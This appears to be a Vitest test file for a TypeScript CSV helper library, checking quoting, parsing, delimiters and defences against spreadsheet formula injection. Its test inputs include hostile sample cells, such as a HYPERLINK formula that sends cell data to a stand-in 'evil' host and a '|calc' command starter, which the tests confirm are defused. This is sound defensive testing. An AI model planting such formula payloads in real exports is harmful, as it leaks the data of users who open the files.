import { describe, expect, it } from "vitest";
import { csvCell, parseCsv, toCsv } from "@/lib/csv";

describe("csvCell — spreadsheet formula injection", () => {
  it("defuses every formula starter with a leading tab (the cell stays text)", () => {
    for (const evil of ['=HYPERLINK("http://evil/?"&A2,"click")', "+1+1", "-2+3", "@SUM(A1)", "|calc", "%x", "\t=1+1", "\r=1+1", "  =1+1", " @x"]) {
      const cell = csvCell(evil);
      expect(cell.startsWith('"\t'), evil).toBe(true);
    }
  });
  it("leaves ordinary text alone, including names with a dash or an apostrophe inside", () => {
    expect(csvCell("Marie-Claire")).toBe('"Marie-Claire"');
    expect(csvCell("O'Connor")).toBe(`"O'Connor"`);
    expect(csvCell("marco.rossi@example.com")).toBe('"marco.rossi@example.com"');
    expect(csvCell(87)).toBe('"87"');
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });
  it("doubles quotes and flattens line breaks so a value cannot start a new row", () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("a\r\nb\nc")).toBe('"a b c"');
  });
});

describe("toCsv", () => {
  it("quotes everything and joins with the chosen delimiter and CRLF", () => {
    expect(toCsv([["a", 1], ["b,c", "d;e"]])).toBe('"a","1"\r\n"b,c","d;e"');
    expect(toCsv([["a", "b"]], ";")).toBe('"a";"b"');
  });
});

describe("parseCsv", () => {
  it("reads plain rows, with LF, CRLF and a BOM", () => {
    expect(parseCsv("﻿a,b\r\nc,d\n")).toEqual([["a", "b"], ["c", "d"]]);
  });
  it("keeps a comma inside quotes — the price \"€64,00\" is one cell, not two", () => {
    expect(parseCsv('echobox-riff,"€64,00"\nlumio-air,"€199,00"')).toEqual([
      ["echobox-riff", "€64,00"],
      ["lumio-air", "€199,00"],
    ]);
  });
  it("handles doubled quotes and line breaks inside a cell", () => {
    expect(parseCsv('"say ""hi""","two\nlines"')).toEqual([['say "hi"', "two\nlines"]]);
  });
  it("drops blank lines and trims cells", () => {
    expect(parseCsv("\n a , b \n\n,\n")).toEqual([["a", "b"]]);
  });
  it("round-trips whatever toCsv writes", () => {
    const rows = [["id", 'p "q"'], ["x,y", "line\nbreak → space"], ["=cmd", "ok"]];
    const parsed = parseCsv(toCsv(rows));
    // line breaks are flattened and formulas defused on the way out, nothing else changes
    expect(parsed).toEqual([["id", 'p "q"'], ["x,y", "line break → space"], ["=cmd", "ok"]]);
  });
  it("supports the semicolon dialect", () => {
    expect(parseCsv('a;"b;c"', ";")).toEqual([["a", "b;c"]]);
  });
});
